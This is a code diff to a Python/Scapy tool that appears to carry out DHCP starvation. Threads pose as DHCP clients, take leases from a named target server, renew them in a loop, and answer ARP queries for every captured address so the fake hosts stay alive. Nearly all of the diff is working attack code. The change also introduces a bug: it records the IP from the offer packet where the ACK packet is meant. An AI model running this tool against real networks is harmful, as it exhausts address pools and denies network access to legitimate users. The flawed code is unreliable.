@@ -17,7 +17,7 @@ OFFER = 2
 ACK = 5
 NAK = 6
 
-TIMEOUT = 0.1
+TIMEOUT = 1
 
 
 class Client(Thread):
@@ -26,6 +26,7 @@ class Client(Thread):
     target_mac = None
     lock = None
     persist = False
+    addresses = {}  # all the address we have
 
     def __init__(self):
         Thread.__init__(self)
@@ -49,12 +50,14 @@ class Client(Thread):
         if not offer_packet:
             return  # if timeout occurs stop the current thread
 
-        self.ip = offer_packet[BOOTP].yiaddr  # get the ip address from the offer packet
+        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
+
         self.request()
         ack_packet = self.sniffer(ACK)
         if not ack_packet:
             sys.exit()
-        self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP
+
+        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
 
         time_for_release = ack_packet[DHCP].lease_time
         # every loop we renew the same ip address
@@ -64,7 +67,7 @@ class Client(Thread):
             ack_packet = self.sniffer(ACK)
             if ack_packet:  # receive ack packet successfully
                 time_for_release = ack_packet[DHCP].lease_time
-                self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP
+                self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
                 self.send_is_at_arp()
                 continue  # renew the lease
             else:  # not receiving ack
@@ -83,7 +86,8 @@ class Client(Thread):
             lfilter=lambda p:
             BOOTP in p and
             UDP in p and
-            p[UDP].sport == 67 and  # the packet is from server (OFFER or ACK)
+            p[IP].src == Client.target and  # accept packets only from the target DHCP server
+            p[UDP].sport == 67 and  # the packet is from server (OFFER, ACK or NAC)
             p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
             dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] in [op, NAK],
         )
@@ -94,11 +98,11 @@ class Client(Thread):
             if not Client.persist:
                 # if not persistent the program terminated when the server is down
                 os._exit(0)
-            # all the threads that came here when its lock going to kill
+            # all the threads that not receive answer while its lock are going to killed
             elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                 # stop create clients, DHCP server is down
                 print('========= LOCK Locked =========')
-                sleep(TIMEOUT * 100)  # try again after TIMEOUT * 100 seconds (if real client disconnect)
+                sleep(TIMEOUT * 10)  # try again after TIMEOUT * 10 seconds (if real client disconnect)
                 Client.lock.release()
                 print('========= LOCK Release =========')
                 return False
@@ -106,8 +110,20 @@ class Client(Thread):
                 # close current thread
                 sys.exit()
 
-        else:
+        else:  # successfully receive the packet
+            print(f'{"A" if op == 5 else "O"}: 0x{self.transaction_id:08x}')
             return packets[0]
+
+    def replace_ip(self, new_ip):
+        """
+        If we receive different ip, set self.ip and update the ips
+        :param new_ip: the new ip address
+        """
+        if new_ip == self.ip:
+            return
+        if self.ip in Client.addresses: del Client.addresses[self.ip]
+        self.ip = new_ip
+        Client.addresses[new_ip] = self.mac
 
     def discover(self):
         print(f'D: 0x{self.transaction_id:08x}')
@@ -149,3 +165,35 @@ class Client(Thread):
         reply = ARP(op=2, hwsrc=self.mac, psrc=self.ip, hwdst=self.target_mac, pdst=self.target)
         # Sends the is at message to the server
         send(reply, iface=self.iface, verbose=0)
+
+
+def arp_is_at_sender():
+    """
+    It listens for ARP who-has packets, and responds with ARP is-at packets
+    """
+    sniff(
+        iface=Client.iface,
+        lfilter=lambda p:
+        ARP in p and
+        p[ARP].op == 1 and  # its arp who-as type
+        p[ARP].pdst in Client.addresses,  # the packet is for one of the clients
+        prn=lambda p:
+        # send arp is-at
+        sendp(
+            Ether(
+                src=Client.addresses[p[ARP].pdst],
+                dst=p[Ether].src
+            ) / ARP(
+                op=2,  # is-at
+                hwsrc=Client.addresses[p[ARP].pdst],
+                hwdst=p[Ether].src,
+                psrc=p[ARP].pdst,
+                pdst=p[ARP].psrc,
+            ),
+            verbose=0,
+            iface=Client.iface
+        ),
+    )
+
+
+Thread(target=arp_is_at_sender).start()  # run thread to answer all of arp request send to our ips
